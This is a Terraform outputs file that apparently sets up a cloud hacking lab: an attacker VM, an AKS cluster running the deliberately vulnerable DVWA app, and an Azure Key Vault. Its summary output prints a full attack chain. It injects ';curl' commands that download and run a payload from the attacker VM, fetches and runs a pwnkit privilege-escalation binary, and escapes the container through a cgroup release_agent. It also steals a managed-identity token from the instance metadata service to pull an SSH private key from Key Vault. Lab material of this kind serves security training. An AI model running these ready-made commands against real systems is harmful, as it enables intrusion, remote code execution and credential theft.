output "resource_group_name" {
  value = azurerm_resource_group.rg.name
}

output "public_ip_address" {
  value = azurerm_linux_virtual_machine.attacker_vm.public_ip_address
}

output "tls_private_key" {
  value     = tls_private_key.attacker_vm_ssh.private_key_pem
  sensitive = true
}

output "summary" {
  value = <<EOT

attacker vm public ip: ${azurerm_linux_virtual_machine.attacker_vm.public_ip_address}

terraform output -raw tls_private_key > id_rsa
ssh -o StrictHostKeyChecking=no -i id_rsa azureuser@${azurerm_linux_virtual_machine.attacker_vm.public_ip_address}

export KUBECONFIG="$ {PWD}/aks-kubeconfig"
kubectl apply -f ../assets/dvwa-deployment.yml
kubectl port-forward $(kubectl get pods -o name) 8080:80


Hacking commands:

-----------------------------------dvwa-browser-----------------------------------

;curl -vk http://${azurerm_linux_virtual_machine.attacker_vm.public_ip_address}:8001/met-container -o /tmp/met
;chmod 777 /tmp/met
;/tmp/met

-----------------------------------privilege-escalation---------------------------

cd /tmp
curl -vkO https://pwnkit.s3.amazonaws.com/priv-es
chmod a+x ./priv-es
./priv-es

-----------------------------------container-escape-------------------------------

mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "curl -vk http://${azurerm_linux_virtual_machine.attacker_vm.public_ip_address}:8001/met-host -o /tmp/met" >> /cmd
echo "chmod 777 /tmp/met" >> /cmd
echo "/tmp/met" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

-----------------------------------azure key vault--------------------------------

curl -s -H Metadata:true --noproxy "*" 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'

TOKEN=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net" -H "Metadata: true" | jq -r ".access_token" ) && curl -vk -s -H Metadata:true --noproxy "*" 'https://${azurerm_key_vault.keyvault.name}.vault.azure.net/secrets/private-ssh-key?api-version=2016-10-01' -H "Authorization: Bearer $TOKEN"

cat key-ssh |sed 's/\\n/\n/g' > new-ssh-key
chmod 600 new-ssh-key

curl -4 icanhazip.com
ls /home

ssh -o StrictHostKeyChecking=no -i new-ssh-key ubuntu@<external ip>

EOT
}

resource "local_file" "kubeconfig" {
  depends_on   = [azurerm_kubernetes_cluster.cluster]
  filename     = "aks-kubeconfig"
  content      = azurerm_kubernetes_cluster.cluster.kube_config_raw
}